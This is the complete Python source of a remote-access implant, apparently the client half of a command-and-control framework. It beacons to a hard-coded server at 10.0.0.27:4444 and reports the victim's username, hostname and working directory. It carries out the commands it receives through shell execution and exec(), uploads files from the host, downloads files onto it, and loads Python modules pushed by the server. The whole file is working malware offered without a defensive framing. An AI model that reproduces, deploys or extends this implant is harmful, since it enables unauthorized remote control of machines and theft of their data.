#!/usr/bin/env python
import requests
import time
import os
import getpass
import socket

import pipes

from threading import Thread
from tempfile import NamedTemporaryFile
import subprocess

import shlex

# part of standard library
import shutil

requests.packages.urllib3.disable_warnings()

SETTINGS={
"urls":["https://10.0.0.27:4444/index.php?id=1"],
"attempts":3,
"beacon":10,
"line_cap":100,
"debug":True
}

MODULES={}

def print_debug(e):
    if SETTINGS["debug"]:
        print(e)

def gen_urls():
    i=0
    while True:
        if i < len(SETTINGS["urls"]):
            yield SETTINGS["urls"][i]
            i=i+1
        else:
            i = 0

# Avoid additional dependencies on client
def get_upload_url(url):
    prefix, suffix = url.rsplit("/", 1)
    file, query = suffix.split("?", 1)
    file = "/upload.php"
    if query:
        query = "?"+query

    return "{}{}{}".format(prefix, file, query)

def send_file(filename, url=None):
    if not url:
        url = get_upload_url(SETTINGS['url'])
    print_debug("send_file({}, {})".format(filename, url))
    try:
        f = open(filename, 'rb')
        requests.post(url, files={filename:f}, verify=False)
    except Exception as e:
        print_debug(e)

def exec_py(cmd):
    exec(cmd, globals())

# Master types "download". This function fulfills the command.
# From the implant's perspective, this is an upload
def download(filename, url=None):
    send_file(filename, url=url)

# Master types "upload". This function fulfills the command.
# From the implant's perspective, this is an download
def upload(url, filename=None):
    if not filename:
        filename = os.path.basename(requests.utils.urlparse(url).path)
    r = requests.get(url, verify=False, stream=True)
    with open(filename, 'wb') as f:
        shutil.copyfileobj(r.raw, f)

def _execute(cmd):
    print("Executing {}".format(cmd))
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT,
                              shell=True
    )
    out, err = p.communicate()
    if out.count('\n') > SETTINGS["line_cap"]:
        t = NamedTemporaryFile()
        try:
            t.write(out)
            t.flush()
            send_file(t.name)
        except Exception as e:
            print_debug(e)
        finally:
            os.remove(t.name)
    else:
        send_msg("cmd", out)

def execute(cmd):
    if not isinstance(cmd, basestring):
        # AAAAAHHHHHHHHHHHHHHHHHHHHHHHHH
        #cmd =  ' '.join([str(s) for s in cmd])
        cmd =  ' '.join([pipes.quote(str(s)) for s in cmd])
        print("Str cmd: {}".format(cmd))
        
    thread = Thread(target = _execute, args = (cmd,) )
    thread.start()

def _fix_path(f):
    if os.path.isabs(f):
        return f
    else:
        return os.path.abspath(os.path.expanduser(f))

    
def execute_file(cmd):
    f = None
    arr = None
    if type(cmd) is list or type(cmd) is tuple:
        f = cmd[0]
    elif isinstance(cmd, basestring):
        arr = shlex.split(cmd)
        f = arr[0]
    
    f = _fix_path(f)
    print_debug("File to be executed: {}".format(f))

    if type(cmd) is list or type(cmd) is tuple:
        cmd[0] = f
    elif isinstance(cmd, basestring):
        # NOT SAFE
        cmd = pipes.quote(f)+" ".join([pipes.quote(str(s)) for s in arr[1:]])

    os.chmod(f, 0777)

    execute(cmd) 
def send_msg(m=None, *args):
    print_debug("send_msg({}, {})".format(m, args))
    i = 0
    if "url" not in SETTINGS:
        MODULES["gen_urls"] = gen_urls()
        SETTINGS["url"] = next(MODULES["gen_urls"])

    while i < SETTINGS["attempts"]:
        try:

            if args:
                m = {m:str(*args)}

            if m:
                print_debug("Sending: {}".format(m))
                r = requests.post(SETTINGS["url"], data=m, verify=False)
            else:
                r = requests.get(SETTINGS["url"], verify=False)

            print_debug(r.status_code)
            print_debug(r.text)

            return r

        except Exception as e:
            print_debug(e)
        i = i + 1

    SETTINGS["url"] = next(MODULES["gen_urls"]) 
#
#with open(filename, 'wb') as fd:
#    for chunk in r.iter_content(chunk_size=128):
#        fd.write(chunk)    

#def load_modules(d):
#    MODULES.update({k:eval(v)} for k,v in d.items())

def load_module(m, code):
    print_debug("Loading {}".format(m))
    print_debug("Code {}".format(code))
    g = globals().copy()
    exec(code, g)
    for name, func in g.items():
        if not name in globals():
            print("Module {} Loaded".format(name))
            MODULES[name] = func

def invoke_module(m, args=()):
    MODULES[m](*args)

def set(k, v):
    SETTINGS[k] = v

def poll_for_work(max_duration, max_attempts, freq):
    print_debug("\n\nPolling for work")
    start = time.time()
    attempts = 0
    while time.time() - start < max_duration and attempts < max_attempts:
        payload = do("get_beacon")

        res = do("send_msg", (payload,))
        if get_cmd(res):
            return True
        attempts = attempts + 1
        time.sleep(freq)
        

def shell_SYN(*args):
    res = do("send_msg", ("shell_ACK", True) )
    max_duration = int(SETTINGS["beacon"]) * 5
    max_attempts = 30
    freq = 1
    msg = ["shell_FIN", True]
    
    if not get_cmd(res) and not poll_for_work(max_duration, max_attempts, freq):
        print_debug("\n\nPoll for work failed")
        msg[1] = False
    else:
        time.sleep(2)

    res = do("send_msg", msg )
        

def do(cmd, args=()):
    print_debug("Doing {} ({})".format(cmd, args))

    if not isinstance(args, tuple) and not isinstance(args, list):
        args = (args,)

    print(args)

    if cmd in MODULES: 
        return invoke_module(cmd, args)
    elif cmd in globals():
        return globals()[cmd](*args)
    else:
        #print_debug("{} not found!".format(cmd))
        arr = [cmd]
        arr.extend(args)
        print(arr)
        execute(arr)

#dowload / upload / exec in background / exec and capture output / beacon

def get_cmd(r):
    cmd={}
    try:
        cmd=r.json()
        for k,v in cmd.items():
           do(k, v) 
        return True
    except Exception as e:
        # no work to do
        print("CMD: {} has no work".format(cmd))
        print(e)

def get_target_info():
    return {
        "usr":getpass.getuser(),
        "hostname":socket.gethostname(),
        "cwd": os.getcwd(),
        "time": time.time()
    }

def get_beacon():
    b = get_target_info()
    b["beacon"] = True
    return b

def main():
    while True:
        try:

            payload = do("get_beacon")

            res = do("send_msg", (payload,))
            if get_cmd(res):
                print_debug("Checking for additional commands...")
                continue

            print_debug("Sleeping {} seconds".format(SETTINGS["beacon"]))

            try:
                time.sleep(float(SETTINGS["beacon"]))
            except Exception as e:
                print_debug(e)
                time.sleep(15)
        except Exception as e:
            print_debug(e)
if __name__=="__main__":
    main()

